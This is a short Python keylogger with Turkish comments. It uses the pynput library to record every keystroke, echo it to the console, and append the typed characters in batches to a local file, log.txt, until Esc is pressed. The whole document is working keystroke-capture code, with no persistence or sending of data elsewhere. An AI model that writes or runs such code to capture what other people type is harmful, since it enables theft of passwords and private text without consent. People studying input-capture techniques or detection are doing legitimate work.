import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

# Tusa Basilma olayini bu fonk ile yakalıyoruz
def on_press(key):
    global count, keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# Yazilan yazilari bir metin belgesinde kaydetme fonk.
def write_file(keys):
    with open("log.txt", 'a', encoding='utf-8') as file:
        for key in keys:
            
            k = str(key).replace("'", "") # Tek tirnagi silme islemi
            if k.find('space') > 0: # Her space ibaresi gectiginde
                file.write('\n') # alt satira gec
            elif k.find('Key') == -1: # Key ismini gormezden gel
                file.write(k) # log.txt dosyasina k'lari yazıyor

# Tustan elin cekilmesinde calisacak fonk
def on_release(key):
    if key == Key.esc:  # ESC'ye basildiginda prog. sonlansin
        print('exit')
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
